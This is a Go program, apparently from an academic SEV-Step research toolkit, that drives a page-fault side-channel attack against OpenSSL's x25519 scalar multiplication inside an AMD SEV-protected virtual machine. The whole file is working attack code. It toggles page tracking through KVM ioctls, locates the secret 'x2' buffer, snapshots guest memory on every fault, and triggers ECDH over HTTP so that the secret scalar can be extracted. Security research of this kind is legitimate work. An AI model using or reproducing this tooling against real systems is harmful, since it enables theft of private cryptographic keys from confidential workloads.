//Generates a side channel trace for "crypto/ec/curve25519.c" which allows to extract the secret scalar.
//Require the GPA of the page containing "x25519_scalar_mulx" and the GPA of the page containing
//the "fe64_***"" functions as input
//We toggle track between these two pages. On the first few iterations we also apply write tracking,
//to find the GPA of the "x2" buffer from the OpenSSL code. Once we have this GPA, we take a snapshot
//of the page on every fault
package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/signal"
	"pfFingerprint"
	"strconv"

	"github.com/UzL-ITS/sev-step/sevStep"
)

type appConfig struct {
	gpa1         uint64
	gpa2         uint64
	trackingType sevStep.PageTrackMode
	ignoreCycles int
	triggerURL   string
	outWriter    io.Writer
	getRIP       bool
	cpu          int
}

func processEvent(ioctlAPI *sevStep.IoctlAPI, ev *sevStep.Event, haveWriteGPA bool, writeGPA uint64, wbinvdFlushCPU int) ([]byte, error) {
	if haveWriteGPA {
		mem, err := ioctlAPI.CmdReadGuestMemory(writeGPA, 4096, true, wbinvdFlushCPU)
		if err != nil {
			return nil, fmt.Errorf("Failed to read guest memory : %v\n", err)
		}
		ev.Content = mem
		ev.MonitorGPA = writeGPA
	}
	encodedData, err := json.Marshal(ev)
	if err != nil {
		log.Printf("Failed to encode event : %v\n", ev)
		return nil, fmt.Errorf("failed to json encode : %v", err)
	}
	return encodedData, nil
}

//enterFaultHandlingLoop handles fault events, creates output file. Returns gpa of stack buff for attack or error
// Runs until ctx is cancelled. If no errors occurs pfFingerprint.ErrCtxCancelled is returned
func enterFaultHandlingLoop(ctx context.Context, ioctlAPI *sevStep.IoctlAPI, config *appConfig) (uint64, error) {
	gpa1CycleCount := 0
	inCycle := false
	//preallocate as this is used in hot loop
	cycleLog := make([]uint64, 0, 20000)
	haveWriteGPA := false
	writeGPA := uint64(0)
	var mainLoopErr error
	var ev *sevStep.Event
	var eventCounter = 0

	defer func() {
		log.Printf("Processed %v events\n", eventCounter)
	}()

	for {
		ev, mainLoopErr = pfFingerprint.WaitForEventBlocking(ctx, ioctlAPI)
		if mainLoopErr != nil {
			break
		}
		//handle printing
		switch ev.FaultedGPA {
		case config.gpa1:
			fallthrough
		case config.gpa2:
			encodedEvent, err := processEvent(ioctlAPI, ev, haveWriteGPA, writeGPA, config.cpu)
			if err != nil {
				return 0, fmt.Errorf("processEvent failed : %v\n", err)
			}
			encodedEvent = append(encodedEvent, []byte("\n")...)
			if _, err := config.outWriter.Write(encodedEvent); err != nil {
				return 0, fmt.Errorf("failed to write event : %v\n", err)
			}
		}

		//handle re-tracking
		switch ev.FaultedGPA {
		case config.gpa1:
			if gpa1CycleCount == config.ignoreCycles+1 {
				log.Printf("Write GPA is %x", cycleLog[len(cycleLog)-1])
				inCycle = false
				haveWriteGPA = true
				writeGPA = cycleLog[len(cycleLog)-1]
			}
			//log.Printf("Exec at gpa1")
			if err := ioctlAPI.CmdTrackPage(config.gpa2, config.trackingType); err != nil {
				return 0, fmt.Errorf("failed to track gpa %x : %v", config.gpa2, err)
			}
			if gpa1CycleCount == config.ignoreCycles {
				if err := ioctlAPI.CmdTrackAllPages(sevStep.PageTrackAccess); err != nil {
					return 0, fmt.Errorf("failed to write track all : %v", err)

				}
				inCycle = true
			}
			gpa1CycleCount++
		case config.gpa2:
			//log.Printf("Exec at gpa2")
			if err := ioctlAPI.CmdTrackPage(config.gpa1, config.trackingType); err != nil {
				return 0, fmt.Errorf("failed to track gpa %x : %v", config.gpa1, err)
			}
		default:
			if inCycle {
				cycleLog = append(cycleLog, ev.FaultedGPA)
			}
		}

		if err := ioctlAPI.CmdAckEvent(ev.ID); err != nil {
			return 0, fmt.Errorf("failed to ack event %v : %v", ev, err)
		}
		eventCounter++
	}

	if !errors.Is(mainLoopErr, pfFingerprint.ErrCtxCancelled) {
		return 0, fmt.Errorf("main loop returned error : %v", mainLoopErr)
	}

	if !haveWriteGPA {
		return 0, fmt.Errorf("did not find write gpa")
	}

	return writeGPA, nil
}

func main() {
	gpa1 := flag.Uint64("gpa1", 0, "first gpa for toggle tracking")
	gpa2 := flag.Uint64("gpa2", 0, "second gpa for toggle tracking")
	gpaConfig := flag.String("inConfig", "", "Set -gpa1 and -gpa2 via this text file")
	trackingTypeParam := flag.String("tracking", "execute", "values: {access,execute}. Determines tracking type")
	out := flag.String("out", "attack-log.txt", "output file")
	outConfig := flag.String("outConfig", "attack-config.json", "configuration struct for attack")
	ignoreCycles := flag.Int("ignoreCycles", 3, "Amount of cycles at start to ignore for write addr finding")
	triggerURL := flag.String("trigger", "http://localhost:8080", "URL to trigger ecdh in VM")
	getRIP := flag.Bool("getRIP", true, "Try to get RIP for page fault events. Works only for plain VMs and debug SEV-ES VMs")
	cpu := flag.Int("cpu", -1, "If set, perf readings are done on this cpu and wbinvd flush is executed here before memaccess")

	flag.Parse()

	if ((*gpa1 == 0 || *gpa2 == 0) && *gpaConfig == "") || ((*gpa1 != 0 || *gpa2 != 0) && *gpaConfig != "") {
		log.Printf("Please set either gpa1 and gpa2 or gpaConfig")
		return
	}

	//parse config and set gpa1 and gpa2
	if *gpaConfig != "" {
		rawCfg, err := ioutil.ReadFile(*gpaConfig)
		if err != nil {
			log.Printf("Failed to read config : %v", err)
			return
		}
		sc := bufio.NewScanner(bytes.NewReader(rawCfg))
		sc.Split(bufio.ScanLines)
		gpaInConfig := make([]uint64, 0)
		for sc.Scan() {
			line := sc.Text()
			v, err := strconv.ParseUint(line, 0, 64)
			if err != nil {
				log.Printf("Failed to pares %v to uint : %v", line, err)
				return
			}
			gpaInConfig = append(gpaInConfig, v)
		}
		if err := sc.Err(); err != nil {
			log.Printf("Erroring reading config : %v", err)
			return
		}
		if len(gpaInConfig) != 2 {
			log.Printf("Expected exactly two GPAs in config, got %v\n", len(gpaInConfig))
			return
		}
		*gpa1 = gpaInConfig[0]
		*gpa2 = gpaInConfig[1]
	}

	if *out == "" {
		log.Printf("Pleaset set \"-out\"")
		return
	}

	outFile, err := os.Create(*out)
	if err != nil {
		log.Fatalf("Failed  to create output file : %v\n", err)
	}
	defer outFile.Close()
	outWriter := bufio.NewWriter(outFile)
	defer outWriter.Flush()

	var trackingType sevStep.PageTrackMode
	if *trackingTypeParam == "access" {
		trackingType = sevStep.PageTrackAccess
	} else if *trackingTypeParam == "execute" {
		trackingType = sevStep.PageTrackExec
	} else {
		log.Printf("Please set valid value for \"tracking\" param\n")
		flag.PrintDefaults()
		return
	}

	config := &appConfig{
		gpa1:         *gpa1,
		gpa2:         *gpa2,
		trackingType: trackingType,
		ignoreCycles: *ignoreCycles,
		triggerURL:   *triggerURL,
		outWriter:    outWriter,
		getRIP:       *getRIP,
		cpu:          *cpu,
	}

	ioctlAPI, err := sevStep.NewIoctlAPI("/dev/kvm", config.getRIP)
	if err != nil {
		log.Fatalf("Failed to init ioctl API : %v", err)
	}
	defer ioctlAPI.Close()

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt)
	defer cancel()

	log.Printf("Tracking start page 0x%016x\n", *gpa1)
	if err := ioctlAPI.CmdTrackPage(*gpa1, trackingType); err != nil {
		log.Printf("failed to track %x : %v", *gpa1, err)
		return
	}

	httpReplyContent := &bytes.Buffer{}

	go func() {
		defer cancel()
		log.Printf("Requesting ecdh")
		resp, err := http.Get(*triggerURL)
		if err != nil {
			log.Printf("HTTP request failed : %v", err)
			return
		}
		//drain http body to wait until server is finished
		if _, err := io.Copy(httpReplyContent, resp.Body); err != nil {
			log.Printf("Failed do train http response\n")
		}
		if err := resp.Body.Close(); err != nil {
			log.Printf("Failed to close http response : %v\n", err)
		}
		log.Printf("ecdh done\n")
	}()

	stackBufGPA, err := enterFaultHandlingLoop(ctx, ioctlAPI, config)
	if err != nil {
		log.Printf("fault handling loop returned error : %v", err)
		return
	}

	if _, err := outWriter.Write(httpReplyContent.Bytes()); err != nil {
		log.Printf("Failed to write http reply to outfile : %v", err)
	}

	attackConfig := &pfFingerprint.OSSLAttackConfigECDH{
		BaseGPA:     config.gpa1,
		Fe64GPA:     config.gpa2,
		StackBufGPA: stackBufGPA,
	}
	encoded, err := json.Marshal(attackConfig)
	if err != nil {
		log.Printf("Failed to encode attack config")
		return
	}

	if err := ioutil.WriteFile(*outConfig, encoded, 0777); err != nil {
		log.Printf("Failed to write config  : %v", err)
		return
	}

}
